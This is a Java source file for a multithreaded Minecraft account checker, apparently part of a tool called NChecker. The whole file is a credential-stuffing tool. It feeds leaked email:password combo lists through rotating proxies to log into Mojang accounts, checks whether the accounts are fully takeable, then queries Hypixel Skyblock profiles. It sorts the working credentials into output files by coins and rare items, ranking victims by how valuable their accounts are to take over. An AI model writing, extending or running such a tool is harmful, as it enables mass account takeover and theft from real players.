package dev.tolja.Checkers.Modules;

import dev.tolja.Checkers.Checker;
import dev.tolja.Checkers.OutputManager;
import dev.tolja.Configuration.ConfigManager;
import dev.tolja.Data.HypixelProfile;
import dev.tolja.Data.MojangAccount;
import dev.tolja.Data.ProxyInfo;
import dev.tolja.Nchecker;
import dev.tolja.Utils.HypixelUtils;
import dev.tolja.Utils.IOUtils;
import dev.tolja.Utils.MojangUtils;
import org.fusesource.jansi.Ansi;
import org.fusesource.jansi.AnsiConsole;
import org.fusesource.jansi.internal.Kernel32;

import java.io.File;
import java.net.Proxy;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.atomic.AtomicInteger;

public class SkyblockChecker extends Checker {
    private final AtomicInteger checked = new AtomicInteger();
    private final AtomicInteger fails = new AtomicInteger();
    private final AtomicInteger Dragon = new AtomicInteger();
    private final AtomicInteger TopestWeapon = new AtomicInteger();
    private final AtomicInteger TopestSet = new AtomicInteger();
    private final AtomicInteger Greatthing = new AtomicInteger();
    private final AtomicInteger data = new AtomicInteger();

    @Override
    public void runChecker() {
        ConfigManager configManager = Nchecker.getConfigManager();
        Object[] resources = IOUtils.loadResources(true, configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT, true);
        if (resources == null) return;
        List<ProxyInfo> proxies = (List<ProxyInfo>) resources[0];
        List<MojangAccount> combos = (List<MojangAccount>) resources[1];
        List<String> apiKeys = (List<String>) resources[2];
        OutputManager outputManager = new OutputManager(new File(".", "results/SkyblockChecker/"), "3");
        long startTime = System.currentTimeMillis();
        Kernel32.SetConsoleTitle("NChecker | Starting thread...");
        ExecutorService threadPool = Executors.newFixedThreadPool(configManager.getSettingsConfig().getThreads());
        for (MojangAccount account : combos) {
            Future<?> submit = threadPool.submit(new Runnable() {
                public void run() {
                    int recheckCount = 0;

                        do {
                            if (configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT) {
                                MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout(), configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null);
                            } else {
                                MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout());
                            }
                        } while (!account.isCracked() && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);



                    if (account.isCracked()) {
                        recheckCount = 0;
                        HypixelProfile hypixelProfile = null;
                        account.setSecurity(MojangUtils.isSFA(account, configManager.getSettingsConfig().getTimeout()));
                        AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.GREEN).a("[" + (account.isSecurity() ? "NFA" : "SFA") + "] " + account.getAccount() + ":" + account.getPassword()).reset());
                        List<String> profiles = HypixelUtils.skyblockProfile(apiKeys.get(new Random().nextInt(apiKeys.size())), account.getUuid(), configManager.getSettingsConfig().getTimeout(), null);
                        for(int i = 0; i < profiles.size(); ++i) {
                            if (i != 0) {
                                String profile = profiles.get(i);
                                if (profile != null && !profile.equals("")) {
                                    try {
                                        do {
                                            hypixelProfile = HypixelUtils.getskyblockProfile(profile,account.getUuid(),apiKeys.get(new Random().nextInt(apiKeys.size())), configManager.getSettingsConfig().getTimeout(),null);
                                        } while (hypixelProfile == null && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);
                                    } catch (Exception e) {
                                    }
                                    if (hypixelProfile != null) {
                                        if (hypixelProfile.getSkyblockCoins() >= 10000000) {
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[Coins 10m+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine("coins 10m+.txt", account.getAccount() + ":" + account.getPassword());
                                        }
                                        if (hypixelProfile.getSkyblockArmor().contains("Hyperion") | hypixelProfile.getSkyblockArmor().contains("Scylla") | hypixelProfile.getSkyblockArmor().contains("Valkyrie") | hypixelProfile.getSkyblockArmor().contains("Astraea")) {
                                            TopestWeapon.getAndIncrement();
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[TopestWeapon] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine("TopestWeapon.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                        } else if (hypixelProfile.getSkyblockArmor().contains("Goldor's") | hypixelProfile.getSkyblockArmor().contains("Necron") | hypixelProfile.getSkyblockArmor().contains("Storm's") | hypixelProfile.getSkyblockArmor().contains("Maxor's") | hypixelProfile.getSkyblockArmor().contains("Warden Helmet") | hypixelProfile.getSkyblockArmor().contains("Diamond Necron Head")) {
                                            TopestSet.getAndIncrement();
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[TopestSet] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine("TopestSet.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                        } else if (hypixelProfile.getSkyblockArmor().contains("Elegant Tuxedo") | hypixelProfile.getSkyblockArmor().contains("Shadow Assassin") | hypixelProfile.getSkyblockArmor().contains("Axe Of The Shredded") | hypixelProfile.getSkyblockArmor().contains("Giant's Sword") | hypixelProfile.getSkyblockArmor().contains("Daedalus Axe") | hypixelProfile.getSkyblockArmor().contains("Hegemony Artifact")) {
                                            Greatthing.getAndIncrement();
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[GreatThing] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine("GreatThing.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                        } else if (hypixelProfile.getSkyblockArmor().contains("Dragon")) {
                                            Dragon.getAndIncrement();
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Dragon] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine("Dragon.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                        } else if (hypixelProfile.getSkyblockArmor().length() >= 6) {
                                            data.getAndIncrement();
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Profile] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine("Profile.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                        } else {
                                            AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.CYAN).a("[null] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine("null.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + hypixelProfile.getSkyblockArmor());
                                        }
                                    } else {
                                        AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.CYAN).a("[null] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine("null.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName());
                                    }
                                }
                            }
                        }

                    } else {
                        fails.getAndIncrement();
                        if (configManager.getSettingsConfig().isPrintFailed()) {
                            AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.RED).a("[Failed] " + account.getAccount() + ":" + account.getPassword()).reset());
                        }
                        if (configManager.getSettingsConfig().isSaveFailed()) {
                            outputManager.writeLine("Failed.txt", account.getAccount() + ":" + account.getPassword());
                        }
                    }
                    checked.getAndIncrement();
                }
            });
        }
        threadPool.shutdown();
        ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) threadPool;
        SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        while (!threadPool.isTerminated()) {
            try {
                int time = (int) ((System.currentTimeMillis() - startTime) / 1000);
                Kernel32.SetConsoleTitle("NChecker"
                        + " | Checked: " + checked.get() + "/" + combos.size() + " (" + String.format("%.2f", (double) checked.get() / combos.size() * 100) + "%)"
                        + " - " + "Failed: " + fails.get() + "| Cpm: " + (int) Math.ceil((double) checked.get() / time * 60)
                        + " | Elapsed: " + dateFormat.format(new Date(System.currentTimeMillis() - startTime - (8 * 60 * 60 * 1000))));
                Thread.sleep(1000);
            } catch (Exception ignored) {

            }
        }
        Kernel32.SetConsoleTitle("NChecker | Ver " + Nchecker.VERSION);
        AnsiConsole.out.println(Ansi.ansi().fg(Ansi.Color.CYAN).a(
                "\r\nAll done.\r\n"
        ).reset());
        AnsiConsole.out.println(Ansi.ansi().fgBrightYellow().a("TopestWeapon: " + TopestWeapon.get() + "\r\n" +
                "TopestSet: " + TopestSet.get() + "\r\n" +
                "GreatThing: " + Greatthing.get() + "\r\n" +
                "Profile: " + data.get() + "\r\n" +
                "Dragon: " + Dragon.get() + "\r\n"
        ).reset());
    }

}
